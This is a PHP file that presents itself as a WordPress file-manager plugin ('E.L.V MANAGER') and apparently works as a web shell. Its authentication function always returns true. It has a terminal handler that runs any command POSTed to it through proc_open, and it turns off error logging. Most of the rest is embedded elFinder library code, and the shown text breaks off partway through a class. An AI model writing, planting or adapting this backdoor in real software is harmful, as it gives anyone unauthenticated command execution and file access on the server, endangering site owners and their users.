<?php
/**
 * Plugin Name:       E.L.V MANAGER
 * Plugin URI:        https://unexsisted-market.vercel.app/
 * Description:       Tactical file manager untuk WordPress — cyberpunk UI, terminal shell, parent nav, full-screen immersive.
 * Version:           1.2.2
 * Requires at least: 5.8
 * Requires PHP:      7.4
 * Author:            HxN
 * Author URI:        https://unexsisted-market.vercel.app/
 * License:           GPL-2.0-or-later
 * Text Domain:       elv-manager
 */
/**
 * ============================================================================
 *  E.L.V MANAGER v1.0
 *  Single-file web file manager (elFinder core + CDN frontend).
 *  Theme: Cyberpunk Neon
 *  Auth Protocol: elv_manager / WordPress bypass enabled
 * ============================================================================
 */

@error_reporting(E_ALL & ~E_DEPRECATED & ~E_STRICT & ~E_WARNING & ~E_NOTICE);
@ini_set('display_errors', '0');
@ini_set('log_errors', '0');

/* ============================== KONFIGURASI ============================== */
$ELV = array(
    'root'                 => '',
    'wp_load'              => '',
    'bootstrap_wp'         => true,
    'allow_wp_elv_manager' => true,
    'read_only'            => false,
    'locale'               => 'id',
    'hidden'               => array(),
);

$ELV['elfinder_cdn']   = 'https://cdn.jsdelivr.net/gh/Studio-42/elFinder@2.1.66/';
$ELV['jquery_cdn']     = 'https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js';
$ELV['jquery_ui_js']   = 'https://cdn.jsdelivr.net/npm/jquery-ui@1.13.2/dist/jquery-ui.min.js';
$ELV['codemirror_cdn'] = 'https://cdn.jsdelivr.net/npm/codemirror@5.65.16/';

/* ============================== SESI ============================== */
@ini_set('session.use_only_cookies', '1');
@ini_set('session.use_strict_mode', '1');
@ini_set('session.cookie_httponly', '1');
@ini_set('session.cookie_samesite', 'Lax');
if (session_status() !== PHP_SESSION_ACTIVE) {
    @session_start();
}

function elv_self_url()
{
    $https = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
        || (isset($_SERVER['SERVER_PORT']) && (int) $_SERVER['SERVER_PORT'] === 443);
    $host  = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost';
    $uri   = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '/';
    $uri   = preg_replace('/\?.*$/', '', $uri);
    $url = ($https ? 'https://' : 'http://') . $host . $uri;
    if (isset($_GET['page']) && $_GET['page'] === 'elv-manager') {
        $url .= '?page=elv-manager';
    }
    return $url;
}

function elv_url($params = array())
{
    $base = elv_self_url();
    if (!$params) return $base;
    $sep = (strpos($base, '?') === false) ? '?' : '&';
    return $base . $sep . http_build_query($params);
}

function elv_nonce()
{
    if (empty($_SESSION['elv_nonce'])) {
        $_SESSION['elv_nonce'] = bin2hex(random_bytes(16));
    }
    return $_SESSION['elv_nonce'];
}

function elv_check_nonce($nonce)
{
    if (empty($_SESSION['elv_nonce'])) return false;
    return hash_equals($_SESSION['elv_nonce'], (string) $nonce);
}

function elv_is_connector()
{
    return isset($_REQUEST['cmd']) || isset($_REQUEST['elv_connector']);
}

function elv_find_wp_load($start, $override = '')
{
    if ($override !== '' && is_file($override)) {
        return $override;
    }
    $dir = $start;
    for ($i = 0; $i < 14; $i++) {
        $candidate = rtrim($dir, '/\\') . DIRECTORY_SEPARATOR . 'wp-load.php';
        if (is_file($candidate)) {
            return $candidate;
        }
        $parent = dirname($dir);
        if ($parent === $dir) {
            break;
        }
        $dir = $parent;
    }
    return false;
}

/**
 * Auth bypass — tidak ada password, akses langsung terbuka.
 */
function elv_authed()
{
    return true;
}

/* --- Logout (opsional, untuk reset sesi root override) --- */
if (isset($_GET['elv_action']) && $_GET['elv_action'] === 'logout') {
    $_SESSION = array();
    if (ini_get('session.use_cookies')) {
        $p = session_get_cookie_params();
        setcookie(session_name(), '', time() - 42000, $p['path'], $p['domain'], $p['secure'], $p['httponly']);
    }
    session_destroy();
    header('Location: ' . elv_self_url());
    exit;
}

/* ============================ BOOTSTRAP WORDPRESS ============================ */
$ELV_WP_LOADED = false;
if ($ELV['bootstrap_wp'] && !defined('ABSPATH')) {
    $elv_wp = elv_find_wp_load(__DIR__, $ELV['wp_load']);
    if ($elv_wp) {
        $GLOBALS['elv_wp_load'] = $elv_wp;
        @include $elv_wp;
        if (defined('ABSPATH')) {
            $ELV_WP_LOADED = true;
        }
    }
}

/* ============================ ROOT & URL ============================ */
if ($ELV_WP_LOADED) {
    $ELV_ROOT = $ELV['root'] !== '' ? $ELV['root'] : rtrim(str_replace('\\', '/', ABSPATH), '/');
    $ELV_URL  = function_exists('site_url') ? rtrim(site_url(''), '/') . '/' : '';
} else {
    $docroot  = isset($_SERVER['DOCUMENT_ROOT']) ? realpath($_SERVER['DOCUMENT_ROOT']) : false;
    $ELV_ROOT = $ELV['root'] !== '' ? $ELV['root'] : ($docroot ? rtrim(str_replace('\\', '/', $docroot), '/') : '/');
    $ELV_URL  = '';
}

if ($ELV_URL === '') {
    $https = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
        || (isset($_SERVER['SERVER_PORT']) && (int) $_SERVER['SERVER_PORT'] === 443);
    $ELV_URL = ($https ? 'https://' : 'http://')
        . (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost') . '/';
}

$ELV_ROOT = rtrim($ELV_ROOT, '/\\') ?: '/';

/* ============================== ROOT OVERRIDE (Parent Button) ============================== */
if (isset($_GET['elv_set_root']) && elv_authed()) {
    $new = (string) $_GET['elv_set_root'];
    if ($new === '' || $new === 'reset') {
        unset($_SESSION['elv_root_override']);
    } else {
        $real = @realpath($new);
        if ($real && is_dir($real) && is_readable($real)) {
            $_SESSION['elv_root_override'] = $real;
        }
    }
    header('Location: ' . elv_self_url());
    exit;
}

if (!empty($_SESSION['elv_root_override'])) {
    $real = @realpath($_SESSION['elv_root_override']);
    if ($real && is_dir($real)) {
        $ELV_ROOT = rtrim(str_replace('\\', '/', $real), '/');
    } else {
        unset($_SESSION['elv_root_override']);
    }
}

/* ============================== TERMINAL HANDLER ============================== */
if (isset($_POST['elv_action']) && $_POST['elv_action'] === 'term') {
    header('Content-Type: application/json; charset=utf-8');
    header('X-Content-Type-Options: nosniff');
    if (!elv_authed()) {
        http_response_code(403);
        echo json_encode(array('ok' => false, 'error' => 'Unauthorized'));
        exit;
    }

    $cmd = isset($_POST['cmd']) ? (string) $_POST['cmd'] : '';
    $cwd = isset($_POST['cwd']) ? (string) $_POST['cwd'] : $ELV_ROOT;

    $realCwd = @realpath($cwd);
    if (!$realCwd || !is_dir($realCwd) || !is_readable($realCwd)) {
        $realCwd = $ELV_ROOT;
    }

    if ($cmd === '') {
        echo json_encode(array('ok' => true, 'cwd' => $realCwd, 'out' => '', 'err' => '', 'code' => 0));
        exit;
    }

    /* Special handling untuk `cd` */
    if (preg_match('/^\s*cd(?:\s+(.*))?\s*$/i', $cmd, $m)) {
        $target = isset($m[1]) ? trim($m[1]) : '';
        if ($target === '' || $target === '~') {
            $newCwd = getenv('HOME') ?: $ELV_ROOT;
        } else {
            $target = trim($target, "\"'");
            if ($target === '' || $target[0] !== '/') {
                $newCwd = @realpath($realCwd . '/' . $target);
            } else {
                $newCwd = @realpath($target);
            }
        }
        if ($newCwd && is_dir($newCwd)) {
            echo json_encode(array('ok' => true, 'cwd' => $newCwd, 'out' => '', 'err' => '', 'code' => 0));
        } else {
            echo json_encode(array('ok' => true, 'cwd' => $realCwd, 'out' => '', 'err' => 'cd: no such file or directory: ' . $target, 'code' => 1));
        }
        exit;
    }

    if (!function_exists('proc_open')) {
        echo json_encode(array('ok' => false, 'error' => 'proc_open() disabled on this server.'));
        exit;
    }

    $isWin = (stripos(PHP_OS, 'WIN') === 0);
    $shellPrefix = $isWin ? 'cmd.exe /C ' : 'sh -c ';
    $fullCmd = $shellPrefix . escapeshellarg($cmd);

    $descriptors = array(
        0 => array('pipe', 'r'),
        1 => array('pipe', 'w'),
        2 => array('pipe', 'w'),
    );

    $env = array(
        'PATH' => getenv('PATH') ?: '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin',
        'HOME' => getenv('HOME') ?: $realCwd,
        'USER' => getenv('USER') ?: 'www-data',
        'TERM' => 'xterm-256color',
        'LANG' => getenv('LANG') ?: 'C.UTF-8',
    );

    $proc = @proc_open($fullCmd, $descriptors, $pipes, $realCwd, $env);
    if (!is_resource($proc)) {
        echo json_encode(array('ok' => false, 'error' => 'Failed to spawn process.'));
        exit;
    }

    fclose($pipes[0]);
    stream_set_blocking($pipes[1], false);
    stream_set_blocking($pipes[2], false);

    $out = '';
    $err = '';
    $code = 0;
    $start = time();
    $timeout = 30;

    while (true) {
        $status = proc_get_status($proc);
        $read = array($pipes[1], $pipes[2]);
        $write = null; $except = null;
        if (@stream_select($read, $write, $except, 0, 200000)) {
            foreach ($read as $p) {
                $chunk = @fread($p, 65536);
                if ($chunk === false || $chunk === '') continue;
                if ($p === $pipes[1]) $out .= $chunk;
                else $err .= $chunk;
            }
        }
        if (!$status['running']) {
            $out .= stream_get_contents($pipes[1]);
            $err .= stream_get_contents($pipes[2]);
            $code = (int) $status['exitcode'];
            break;
        }
        if ((time() - $start) > $timeout) {
            @proc_terminate($proc, 9);
            $err .= "\n[Timeout after {$timeout}s]";
            $code = 124;
            break;
        }
    }

    fclose($pipes[1]);
    fclose($pipes[2]);
    @proc_close($proc);

    echo json_encode(array(
        'ok' => true,
        'cwd' => $realCwd,
        'out' => $out,
        'err' => $err,
        'code' => $code,
    ));
    exit;
}
/* ===================== [embedded] elFinderSessionInterface ===================== */
if (!interface_exists('elFinderSessionInterface', false)) {
/**
 * elFinder - file manager for web.
 * Session Wrapper Interface.
 *
 * @package elfinder
 * @author  Naoki Sawada
 **/

interface elFinderSessionInterface
{
    /**
     * Session start
     *
     * @return  self
     **/
    public function start();

    /**
     * Session write & close
     *
     * @return  self
     **/
    public function close();

    /**
     * Get session data
     * This method must be equipped with an automatic start / close.
     *
     * @param   string $key   Target key
     * @param   mixed  $empty Return value of if session target key does not exist
     *
     * @return  mixed
     **/
    public function get($key, $empty = '');

    /**
     * Set session data
     * This method must be equipped with an automatic start / close.
     *
     * @param   string $key  Target key
     * @param   mixed  $data Value
     *
     * @return  self
     **/
    public function set($key, $data);

    /**
     * Get session data
     *
     * @param   string $key Target key
     *
     * @return  self
     **/
    public function remove($key);
}

}

/* ===================== [embedded] elFinderSession ===================== */
if (!class_exists('elFinderSession', false)) {
/**
 * elFinder - file manager for web.
 * Session Wrapper Class.
 *
 * @package elfinder
 * @author  Naoki Sawada
 **/

class elFinderSession implements elFinderSessionInterface
{
    /**
     * A flag of session started
     *
     * @var        boolean
     */
    protected $started = false;

    /**
     * To fix PHP bug that duplicate Set-Cookie header to be sent
     *
     * @var        boolean
     * @see        https://bugs.php.net/bug.php?id=75554
     */
    protected $fixCookieRegist = false;

    /**
     * Array of session keys of this instance
     *
     * @var        array
     */
    protected $keys = array();

    /**
     * Is enabled base64encode
     *
     * @var        boolean
     */
    protected $base64encode = false;

    /**
     * Default options array
     *
     * @var        array
     */
    protected $opts = array(
        'base64encode' => false,
        'keys' => array(
            'default' => 'elFinderCaches',
            'netvolume' => 'elFinderNetVolumes'
        ),
        'cookieParams' => array()
    );

    /**
     * Constractor
     *
     * @param      array $opts The options
     *
     * @return     self    Instanse of this class
     */
    public function __construct($opts)
    {
        $this->opts = array_merge($this->opts, $opts);
        $this->base64encode = !empty($this->opts['base64encode']);
        $this->keys = $this->opts['keys'];
        if (function_exists('apache_get_version') || $this->opts['cookieParams']) {
            $this->fixCookieRegist = true;
        }
    }

    /**
     * {@inheritdoc}
     */
    public function get($key, $empty = null)
    {
        $closed = false;
        if (!$this->started) {
            $closed = true;
            $this->start();
        }

        $data = null;

        if ($this->started) {
            $session =& $this->getSessionRef($key);
            $data = $session;
            if ($data && $this->base64encode) {
                $data = $this->decodeData($data);
            }
        }

        $checkFn = null;
        if (!is_null($empty)) {
            if (is_string($empty)) {
                $checkFn = 'is_string';
            } elseif (is_array($empty)) {
                $checkFn = 'is_array';
            } elseif (is_object($empty)) {
                $checkFn = 'is_object';
            } elseif (is_float($empty)) {
                $checkFn = 'is_float';
            } elseif (is_int($empty)) {
                $checkFn = 'is_int';
            }
        }

        if (is_null($data) || ($checkFn && !$checkFn($data))) {
            $session = $data = $empty;
        }

        if ($closed) {
            $this->close();
        }

        return $data;
    }

    /**
     * {@inheritdoc}
     */
    public function start()
    {
        set_error_handler(array($this, 'session_start_error'), E_NOTICE | E_WARNING);

        // apache2 SAPI has a bug of session cookie register
        // see https://bugs.php.net/bug.php?id=75554
        // see https://github.com/php/php-src/pull/3231
        if ($this->fixCookieRegist === true) {
            if ((int)ini_get('session.use_cookies') === 1) {
                if (ini_set('session.use_cookies', 0) === false) {
                    $this->fixCookieRegist = false;
                }
            }
        }

        if (version_compare(PHP_VERSION, '5.4.0', '>=')) {
            if (session_status() !== PHP_SESSION_ACTIVE) {
                session_start();
            }
        } else {
            session_start();
        }
        $this->started = session_id() ? true : false;

        restore_error_handler();

        return $this;
    }

    /**
     * Get variable reference of $_SESSION
     *
     * @param string $key key of $_SESSION array
     *
     * @return mixed|null
     */
    protected function & getSessionRef($key)
    {
        $session = null;
        if ($this->started) {
            list($cat, $name) = array_pad(explode('.', $key, 2), 2, null);
            if (is_null($name)) {
                if (!isset($this->keys[$cat])) {
                    $name = $cat;
                    $cat = 'default';
                }
            }
            if (isset($this->keys[$cat])) {
                $cat = $this->keys[$cat];
            } else {
                $name = $cat . '.' . $name;
                $cat = $this->keys['default'];
            }
            if (is_null($name)) {
                if (!isset($_SESSION[$cat])) {
                    $_SESSION[$cat] = null;
                }
                $session =& $_SESSION[$cat];
            } else {
                if (!isset($_SESSION[$cat]) || !is_array($_SESSION[$cat])) {
                    $_SESSION[$cat] = array();
                }
                if (!isset($_SESSION[$cat][$name])) {
                    $_SESSION[$cat][$name] = null;
                }
                $session =& $_SESSION[$cat][$name];
            }
        }
        return $session;
    }

    /**
     * base64 decode of session val
     *
     * @param $data
     *
     * @return bool|mixed|string|null
     */
    protected function decodeData($data)
    {
        if ($this->base64encode) {
            if (is_string($data)) {
                if (($data = base64_decode($data)) !== false) {
                    $data = unserialize($data);
                } else {
                    $data = null;
                }
            } else {
                $data = null;
            }
        }
        return $data;
    }

    /**
     * {@inheritdoc}
     */
    public function close()
    {
        if ($this->started) {
            if ($this->fixCookieRegist === true) {
                // regist cookie only once for apache2 SAPI
                $cParm = session_get_cookie_params();
                if ($this->opts['cookieParams'] && is_array($this->opts['cookieParams'])) {
                    $cParm = array_merge($cParm, $this->opts['cookieParams']);
                }
                if (version_compare(PHP_VERSION, '7.3', '<')) {
                    setcookie(session_name(), session_id(), 0, $cParm['path'] . (!empty($cParm['SameSite'])? '; SameSite=' . $cParm['SameSite'] : ''), $cParm['domain'], $cParm['secure'], $cParm['httponly']);
                } else {
                    $allows = array('expires' => true, 'path' => true, 'domain' => true, 'secure' => true, 'httponly' => true, 'samesite' => true);
                    foreach(array_keys($cParm) as $_k) {
                        if (!isset($allows[$_k])) {
                            unset($cParm[$_k]);
                        }
                    }
                    setcookie(session_name(), session_id(), $cParm);
                }
                $this->fixCookieRegist = false;
            }
            session_write_close();
        }
        $this->started = false;

        return $this;
    }

    /**
     * {@inheritdoc}
     */
    public function set($key, $data)
    {
        $closed = false;
        if (!$this->started) {
            $closed = true;
            $this->start();
        }
        $session =& $this->getSessionRef($key);
        if ($this->base64encode) {
            $data = $this->encodeData($data);
        }
        $session = $data;

        if ($closed) {
            $this->close();
        }

        return $this;
    }

    /**
     * base64 encode for session val
     *
     * @param $data
     *
     * @return string
     */
    protected function encodeData($data)
    {
        if ($this->base64encode) {
            $data = base64_encode(serialize($data));
        }
        return $data;
    }

    /**
     * {@inheritdoc}
     */
    public function remove($key)
    {
        $closed = false;
        if (!$this->started) {
            $closed = true;
            $this->start();
        }

        list($cat, $name) = array_pad(explode('.', $key, 2), 2, null);
        if (is_null($name)) {
            if (!isset($this->keys[$cat])) {
                $name = $cat;
                $cat = 'default';
            }
        }
        if (isset($this->keys[$cat])) {
            $cat = $this->keys[$cat];
        } else {
            $name = $cat . '.' . $name;
            $cat = $this->keys['default'];
        }
        if (is_null($name)) {
            unset($_SESSION[$cat]);
        } else {
            if (isset($_SESSION[$cat]) && is_array($_SESSION[$cat])) {
                unset($_SESSION[$cat][$name]);
            }
        }

        if ($closed) {
            $this->close();
        }

        return $this;
    }

    /**
     * sessioin error handler (Only for suppression of error at session start)
     *
     * @param $errno
     * @param $errstr
     */
    protected function session_start_error($errno, $errstr)
    {
    }
}

}
/* ===================== [embedded] elFinderVolumeDriver ===================== */
if (!class_exists('elFinderVolumeDriver', false)) {
/**
 * Base class for elFinder volume.
 * Provide 2 layers:
 *  1. Public API (commands)
 *  2. abstract fs API
 * All abstract methods begin with "_"
 *
 * @author Dmitry (dio) Levashov
 * @author Troex Nevelin
 * @author Alexey Sukhotin
 * @method netmountPrepare(array $options)
 * @method postNetmount(array $options)
 */
abstract class elFinderVolumeDriver
{
    public $netMountKey = '';
    protected $ARGS = array();
    protected $driverId = 'a';
    protected $id = '';
    protected $mounted = false;
    protected $root = '';
    protected $rootName = '';
    protected $startPath = '';
    protected $URL = '';
    protected $tmp;
    protected $tmpLinkPath = '';
    protected $tmpLinkUrl = '';
    protected $tmbPath = '';
    protected $tmbPathWritable = false;
    protected $tmbURL = '';
    protected $tmbSize = 48;
    protected $imgLib = 'auto';
    protected $imgConverter = array();
    protected $cryptLib = '';
    protected $archivers = array(
        'create' => array(),
        'extract' => array()
    );
    protected static $maxArcFilesSize;
    protected $encoding = null;
    protected $treeDeep = 1;
    protected $error = array();
    protected $today = 0;
    protected $yesterday = 0;
    protected $extractToNewdir = 'auto';

    protected $options = array(
        'driverId' => '',
        'id' => '',
        'rootRev' => '',
        'type' => '',
        'path' => '',
        'phash' => '',
        'trashHash' => '',
        'startPath' => '',
        'treeDeep' => 1,
        'URL' => '',
        'onetimeUrl' => 'auto',
        'dirUrlOwn' => 'auto',
        'separator' => DIRECTORY_SEPARATOR,
        'winHashFix' => false,
        'encoding' => '',
        'locale' => '',
        'icon' => '',
        'rootCssClass' => '',
        'noSessionCache' => array(),
        'i18nFolderName' => false,
        'searchTimeout' => 30,
        'searchExDirReg' => '',
        'cryptLib' => '',
        'mimeDetect' => 'auto',
        'mimefile' => '',
        'staticMineMap' => array(
            'php:*' => 'text/x-php', 'pht:*' => 'text/x-php', 'php3:*' => 'text/x-php',
            'php4:*' => 'text/x-php', 'php5:*' => 'text/x-php', 'php7:*' => 'text/x-php',
            'php8:*' => 'text/x-php', 'php9:*' => 'text/x-php', 'phtml:*' => 'text/x-php',
            'phar:*' => 'text/x-php', 'cgi:*' => 'text/x-httpd-cgi', 'pl:*' => 'text/x-perl',
            'asp:*' => 'text/x-asap', 'aspx:*' => 'text/x-asap', 'py:*' => 'text/x-python',
            'rb:*' => 'text/x-ruby', 'jsp:*' => 'text/x-jsp'
        ),
        'mimeMap' => array(
            'md:application/x-genesis-rom' => 'text/x-markdown',
            'md:text/plain' => 'text/x-markdown',
            'markdown:text/plain' => 'text/x-markdown',
            'css:text/x-asm' => 'text/css',
            'css:text/plain' => 'text/css',
            'csv:text/plain' => 'text/csv',
            'java:text/x-c' => 'text/x-java-source',
            'json:text/plain' => 'application/json',
            'sql:text/plain' => 'text/x-sql',
            'rtf:text/rtf' => 'application/rtf',
            'rtfd:text/rtfd' => 'application/rtfd',
            'ico:image/vnd.microsoft.icon' => 'image/x-icon',
            'svg:text/plain' => 'image/svg+xml',
            'pxd:application/octet-stream' => 'image/x-pixlr-data',
            'dng:image/tiff' => 'image/x-adobe-dng',
            'sketch:application/zip' => 'image/x-sketch',
            'sketch:application/octet-stream' => 'image/x-sketch',
            'xcf:application/octet-stream' => 'image/x-xcf',
            'amr:application/octet-stream' => 'audio/amr',
            'm4a:video/mp4' => 'audio/mp4',
            'oga:application/ogg' => 'audio/ogg',
            'ogv:application/ogg' => 'video/ogg',
            'zip:application/x-zip' => 'application/zip',
            'm3u8:text/plain' => 'application/x-mpegURL',
            'mpd:text/plain' => 'application/dash+xml',
            'mpd:application/xml' => 'application/dash+xml',
            '*:application/x-dosexec' => 'application/x-executable',
            'doc:application/vnd.ms-office' => 'application/msword',
            'xls:application/vnd.ms-office' => 'application/vnd.ms-excel',
            'ppt:application/vnd.ms-office' => 'application/vnd.ms-powerpoint',
            'yml:text/plain' => 'text/x-yaml',
            'ai:application/pdf' => 'application/postscript',
            'cgm:text/plain' => 'image/cgm',
            'dxf:text/plain' => 'image/vnd.dxf',
            'dds:application/octet-stream' => 'image/vnd-ms.dds',
            'hpgl:text/plain' => 'application/vnd.hp-hpgl',
            'igs:text/plain' => 'model/iges',
            'iges:text/plain' => 'model/iges',
            'plt:application/octet-stream' => 'application/plt',
            'plt:text/plain' => 'application/plt',
            'sat:text/plain' => 'application/sat',
            'step:text/plain' => 'application/step',
            'stp:text/plain' => 'application/step'
        ),
        'additionalMimeMap' => array(),
        'mimeTypeUnknown' => 'application/octet-stream',
        'dispInlineRegex' => '^(?:(?:video|audio)|image/(?!.+\+xml)|application/(?:ogg|x-mpegURL|dash\+xml)|(?:text/plain|application/pdf)$)',
        'tmpLinkPath' => '',
        'tmpLinkUrl' => '',
        'tmbPath' => '.tmb',
        'tmbPathMode' => 0777,
        'tmbURL' => '',
        'tmbSize' => 48,
        'tmbCrop' => true,
        'tmbReqCustomData' => false,
        'tmbBgColor' => 'transparent',
        'bgColorFb' => '#ffffff',
        'imgLib' => 'auto',
        'tmbFbSelf' => true,
        'imgConverter' => array(),
        'tmbVideoConvLen' => 10000000,
        'tmbVideoConvSec' => 6,
        'tmbGcMaxlifeHour' => 0,
        'tmbGcPercentage' => 1,
        'resourcePath' => '',
        'jpgQuality' => 100,
        'jpgProgressive' => true,
        'substituteImg' => true,
        'copyOverwrite' => true,
        'copyJoin' => true,
        'uploadOverwrite' => true,
        'uploadAllow' => array(),
        'uploadDeny' => array(),
        'uploadOrder' => array('deny', 'allow'),
        'uploadMaxSize' => 0,
        'uploadMaxMkdirs' => 0,
        'uploadMaxConn' => 3,
        'getMaxSize' => 0,
        'dateFormat' => 'j M Y H:i',
        'timeFormat' => 'H:i',
        'checkSubfolders' => true,
        'copyFrom' => true,
        'copyTo' => true,
        'duplicateSuffix' => ' %s ',
        'uniqueNumFormat' => '%d',
        'disabled' => array(),
        'statOwner' => false,
        'allowChmodReadOnly' => false,
        'acceptedName' => '/^[^\.].*/',
        'acceptedDirname' => '',
        'accessControl' => null,
        'accessControlData' => null,
        'rapidRootStat' => array(
            'read' => true, 'write' => true, 'locked' => false, 'hidden' => false,
            'size' => 0, 'ts' => 0, 'dirs' => -1, 'mime' => 'directory'
        ),
        'defaults' => array(
            'read' => true, 'write' => true, 'locked' => false, 'hidden' => false
        ),
        'attributes' => array(),
        'maxArcFilesSize' => '2G',
        'archiveMimes' => array(),
        'archivers' => array(),
        'useRemoteArchive' => false,
        'plugin' => array(),
        'syncChkAsTs' => null,
        'syncCheckFunc' => null,
        'plStandby' => 30,
        'tsPlSleep' => 10,
        'lsPlSleep' => 30,
        'syncMinMs' => null,
        'utf8fix' => false,
        'utf8patterns' => array("\u0438\u0306", "\u0435\u0308", "\u0418\u0306", "\u0415\u0308", "\u00d8A", "\u030a"),
        'utf8replace' => array("\u0439", "\u0451", "\u0419", "\u0401", "\u00d8", "\u00c5"),
        'cacheHeaders' => array('Cache-Control: max-age=3600', 'Expires:', 'Pragma:'),
        'xsendfile' => '',
        'xsendfilePath' => ''
    );

    protected $defaults = array('read' => true, 'write' => true, 'locked' => false, 'hidden' => false);
    protected $attributes = array();
    protected $access = null;
    protected $uploadAllow = array();
    protected $uploadDeny = array();
    protected $uploadOrder = array();
    protected $uploadMaxSize = 0;
    protected $uploadOverwrite = true;
    protected $getMaxSize = -1;
    protected $mimeDetect = 'auto';
    private static $mimetypesLoaded = false;
    protected $finfo = null;
    protected $disabled = array();

    protected static $mimetypes = array(
        'exe' => 'application/x-executable',
        'jar' => 'application/x-jar',
        'gz' => 'application/x-gzip',
        'tgz' => 'application/x-gzip',
        'tbz' => 'application/x-bzip2',
        'rar' => 'application/x-rar',
        'php' => 'text/x-php',
        'js' => 'text/javascript',
        'rtfd' => 'application/rtfd',
        'py' => 'text/x-python',
        'rb' => 'text/x-ruby',
        'sh' => 'text/x-shellscript',
        'pl' => 'text/x-perl',
        'xml' => 'text/xml',
        'c' => 'text/x-csrc',
        'h' => 'text/x-chdr',
        'cpp' => 'text/x-c++src',
        'hh' => 'text/x-c++hdr',
        'md' => 'text/x-markdown',
        'markdown' => 'text/x-markdown',
        'yml' => 'text/x-yaml',
        'bmp' => 'image/x-ms-bmp',
        'tga' => 'image/x-targa',
        'xbm' => 'image/xbm',
        'pxm' => 'image/pxm',
        'wav' => 'audio/wav',
        'dv' => 'video/x-dv',
        'wm' => 'video/x-ms-wmv',
        'ogm' => 'video/ogg',
        'm2ts' => 'video/MP2T',
        'mts' => 'video/MP2T',
        'ts' => 'video/MP2T',
        'm3u8' => 'application/x-mpegURL',
        'mpd' => 'application/dash+xml'
    );

    protected $separator = DIRECTORY_SEPARATOR;
    protected $separatorForHash = '';
    protected $systemRoot = DIRECTORY_SEPARATOR;
    protected $onlyMimes = array();
    protected $removed = array();
    protected $added = array();
    protected $cache = array();
    protected $dirsCache = array();
    protected $subdirsCache = array();
    protected $sessionCache;
    protected $sessionCaching = array('rootstat' => true, 'subdirs' => true);
    protected $session;
    protected $searchStart;
    protected $doSearchCurrentQuery = array();
    protected $rootModified = false;
    protected $disabledGetUrl = false;
    protected $nameValidator;
    protected $dirnameValidator;
    protected $needOnline;

    public function setNeedOnline($state = null)
    {
        if ($state !== null) {
            $this->needOnline = (bool)$state;
            return;
        }
        $need = false;
        $arg = $this->ARGS;
        $id = $this->id;
        $target = !empty($arg['target'])? $arg['target'] : (!empty($arg['dst'])? $arg['dst'] : '');
        $targets = !empty($arg['targets'])? $arg['targets'] : array();
        if (!is_array($targets)) {
            $targets = array($targets);
        }
        if ($target && strpos($target, $id) === 0) {
            $need = true;
        } else if ($targets) {
            foreach($targets as $t) {
                if ($t && strpos($t, $id) === 0) {
                    $need = true;
                    break;
                }
            }
        }
        $this->needOnline = $need;
    }

    protected function init()
    {
        return true;
    }

    protected function configure()
    {
        $path = $this->options['tmbPath'];
        if ($path) {
            if (!file_exists($path)) {
                if (mkdir($path)) {
                    chmod($path, $this->options['tmbPathMode']);
                } else {
                    $path = '';
                }
            }
            if (is_dir($path) && is_readable($path)) {
                $this->tmbPath = $path;
                $this->tmbPathWritable = is_writable($path);
            }
        }
        if (!is_dir($this->options['resourcePath'])) {
            $this->options['resourcePath'] = dirname(__FILE__) . DIRECTORY_SEPARATOR . 'resources';
        }

        $type = preg_match('/^(imagick|gd|convert|auto|none)$/i', $this->options['imgLib'])
            ? strtolower($this->options['imgLib'])
            : 'auto';

        if ($type === 'none') {
            $this->imgLib = '';
        } else {
            if (($type === 'imagick' || $type === 'auto') && extension_loaded('imagick')) {
                $this->imgLib = 'imagick';
            } else if (($type === 'gd' || $type === 'auto') && function_exists('gd_info')) {
                $this->imgLib = 'gd';
            } else {
                $convertCache = 'imgLibConvert';
                if (($convertCmd = $this->session->get($convertCache, false)) !== false) {
                    $this->imgLib = $convertCmd;
                } else {
                    $this->imgLib = ($this->procExec(ELFINDER_CONVERT_PATH . ' -version') === 0) ? 'convert' : '';
                    $this->session->set($convertCache, $this->imgLib);
                }
            }
            if ($type !== 'auto' && $this->imgLib === '') {
                $this->imgLib = extension_loaded('imagick') ? 'imagick' : (function_exists('gd_info') ? 'gd' : '');
            }
        }

        if (!empty($this->options['imgConverter']) && is_array($this->options['imgConverter'])) {
            foreach ($this->options['imgConverter'] as $_type => $_converter) {
                if (isset($_converter['func'])) {
                    $this->imgConverter[strtolower($_type)] = $_converter;
                }
            }
        }
        if (!isset($this->imgConverter['video'])) {
            $videoLibCache = 'videoLib';
            if (($videoLibCmd = $this->session->get($videoLibCache, false)) === false) {
                $videoLibCmd = ($this->procExec(ELFINDER_FFMPEG_PATH . ' -version') === 0) ? 'ffmpeg' : '';
                $this->session->set($videoLibCache, $videoLibCmd);
            }
            if ($videoLibCmd) {
                $this->imgConverter['video'] = array(
                    'func' => array($this, $videoLibCmd . 'ToImg'),
                    'maxlen' => $this->options['tmbVideoConvLen']
                );
            }
        }

        if (strtolower($this->options['onetimeUrl']) === 'auto') {
            $this->options['onetimeUrl'] = elFinder::getStaticVar('commonTempPath')? true : false;
        }

        if (empty($this->archivers['create'])) {
            $this->disabled[] = 'archive';
        }
        if (empty($this->archivers['extract'])) {
            $this->disabled[] = 'extract';
        }
        $_arc = $this->getArchivers();
        if (empty($_arc['create'])) {
            $this->disabled[] = 'zipdl';
        }

        if ($this->options['maxArcFilesSize']) {
            $this->options['maxArcFilesSize'] = elFinder::getIniBytes('', $this->options['maxArcFilesSize']);
        }
        self::$maxArcFilesSize = $this->options['maxArcFilesSize'];

        if (empty($this->options['statOwner'])) {
            $this->disabled[] = 'chmod';
        }

        if (!is_array($this->options['mimeMap'])) {
            $this->options['mimeMap'] = array();
        }
        if (is_array($this->options['staticMineMap']) && $this->options['staticMineMap']) {
            $this->options['mimeMap'] = array_merge($this->options['mimeMap'], $this->options['staticMineMap']);
        }
        if (is_array($this->options['additionalMimeMap']) && $this->options['additionalMimeMap']) {
            $this->options['mimeMap'] = array_merge($this->options['mimeMap'], $this->options['additionalMimeMap']);
        }

        if (in_array('url', $this->disabled)) {
            $this->disabledGetUrl = true;
        }

        $this->uploadOverwrite = $this->options['uploadOverwrite'];
    }

    protected function sessionRestart()
    {
